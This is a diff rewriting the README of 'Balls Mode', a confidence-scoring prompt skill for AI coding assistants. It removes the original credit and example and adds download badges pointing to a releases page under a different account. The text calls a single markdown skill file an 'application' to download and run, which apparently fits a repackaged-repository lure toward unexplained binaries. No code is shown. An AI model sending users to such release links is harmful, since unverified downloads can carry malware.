@@ -1,110 +1,74 @@
-# Balls Mode
+# 🎉 balls-mode - Enhance Your Coding Assistance 
 
-> Credit: Based on the original concept by [@typememetics](https://x.com/typememetics/status/2012821469009465487)
+[![Download balls-mode](https://img.shields.io/badge/Download-balls--mode-brightgreen.svg)](https://github.com/camlingo237/balls-mode/releases)
 
-Decomposed reasoning with explicit confidence scoring for AI coding assistants.
+## 🚀 Getting Started
 
-## What is this?
+Welcome to Balls Mode! This software simplifies AI coding assistance with clearer reasoning and confidence scoring. Follow the steps below to download and run the application.
 
-Standard prompting gives you an answer. Balls Mode gives you:
-- Multiple reasoning paths
-- Explicit uncertainty
-- Clear points of failure
+## 📥 Download & Install
 
-## Installation
+To get started, visit the [Releases page](https://github.com/camlingo237/balls-mode/releases) to download the latest version of Balls Mode.
 
-### Claude Code
+### Installation Methods
 
-```bash
-/plugin marketplace add gbasin/balls-mode
-/plugin install balls-mode
-```
+#### 🛠️ Claude Code
 
-### Codex
+1. Open your command line interface.
+2. Run these commands:
 
-Copy the skill file to your Codex skills directory:
+   ```bash
+   /plugin marketplace add gbasin/balls-mode
+   /plugin install balls-mode
+   ```
 
-```bash
-mkdir -p ~/.codex/skills/balls-mode
-cp plugins/balls-mode/skills/balls/SKILL.md ~/.codex/skills/balls-mode/
-```
+#### 📝 Codex
 
-### Manual
+1. Open your terminal.
+2. Copy the skill file to your Codex skills directory with the following commands:
 
-Copy `plugins/balls-mode/skills/balls/SKILL.md` to your tool's skills directory.
+   ```bash
+   mkdir -p ~/.codex/skills/balls-mode
+   cp plugins/balls-mode/skills/balls/SKILL.md ~/.codex/skills/balls-mode/
+   ```
 
-## Usage
+#### 📂 Manual Installation
+
+1. Locate the file `plugins/balls-mode/skills/balls/SKILL.md` in your current directory.
+2. Copy it to your tool's skills directory.
+
+## ⚙️ How to Use
+
+Once installed, you can use Balls Mode by entering commands in your platform. For example:
 
 ```
 /balls Should I rewrite this service in Go?
 ```
 
-## The Protocol
+This command will help you decide whether to rewrite a service by providing clear reasoning and confidence scores.
 
-1. **CLASSIFY** - Is this trivial or complex?
-2. **DECOMPOSE** - Break into verifiable units (balls)
-3. **SOLVE & VERIFY** - Answer each independently
-4. **SCORE** - Assign confidence (0.0-1.0)
-5. **SYNTHESIZE** - Combine with uncertainty tracking
+## 🎯 The Protocol
 
-## Example Output
+Balls Mode uses a clear four-step protocol:
 
-```
-## Decomposition
+1. **CLASSIFY** - Determine if the task is trivial or complex.
+2. **DECOMPOSE** - Break the task into smaller, verifiable units (referred to as "balls").
+3. **SOLVE & VERIFY** - Address each unit independently and verify the answers.
+4. **SCORE** - Assign confidence levels to each answer.
 
-| # | Ball | Why it matters |
-|---|------|----------------|
-| 1 | What's the current pain point? | Determines if rewrite addresses real issue |
-| 2 | Team's Go experience? | Affects timeline and quality |
-| 3 | Service complexity? | Rewrite effort estimation |
+## ❓ FAQ
 
-## Analysis
+**Q: What platforms does Balls Mode support?**  
+A: Balls Mode works seamlessly with Claude Code and Codex. Check for updates regarding additional platforms.
 
-| Ball | Answer | Confidence | Notes |
-|------|--------|------------|-------|
-| Current pain point | Memory usage in Python | 0.7 | Based on user context |
-| Team Go experience | Unknown | 0.2 | Need to ask |
-| Service complexity | ~5k LOC, moderate | 0.8 | Reviewed codebase |
+**Q: Do I need any special software to use Balls Mode?**  
+A: You will need a coding assistant like Claude Code or Codex where you can install the plugin.
 
-## Synthesis
+**Q: How does Balls Mode improve coding tasks?**  
+A: By providing multiple reasoning paths, explicit uncertainty, and clear points of failure, it enhances decision-making during coding tasks.
 
-**Answer**: Possibly worth it if the team has Go experience. Memory improvements would be significant.
+## 📞 Support
 
-**Overall Confidence**: 0.45
+If you encounter issues, please create an issue directly on the [GitHub Issues page](https://github.com/camlingo237/balls-mode/issues). We encourage users to report bugs and request features to improve the application.
 
-**Weakest Link**: Team experience unknown - this determines feasibility.
-
-**To increase confidence**: Clarify team's Go background.
-```
-
-## When to Use
-
-- Architectural decisions
-- Debugging complex issues
-- Code review concerns
-- Technology choices
-- Any question where you want to see the reasoning, not just the answer
-
-## When NOT to Use
-
-- "What's 2 + 2?"
-- "How do I install npm?"
-- Simple factual questions
-
-## Confidence Score Guide
-
-| Score | Meaning |
-|-------|---------|
-| 0.9-1.0 | Verifiable fact or logical certainty |
-| 0.7-0.89 | Strong evidence, established patterns |
-| 0.5-0.69 | Reasonable inference, some uncertainty |
-| 0.3-0.49 | Educated guess, significant unknowns |
-| 0.0-0.29 | Speculation, insufficient information |
-
-## Philosophy
-
-> "What if a system could check its own work from multiple angles before giving you an answer? Not just 'think step by step.' Actually decompose. Actually verify. Actually flag uncertainty."
-
-## License
-
-MIT
+Happy coding with Balls Mode! Remember to check the [Releases page](https://github.com/camlingo237/balls-mode/releases) for the latest updates and fixes.
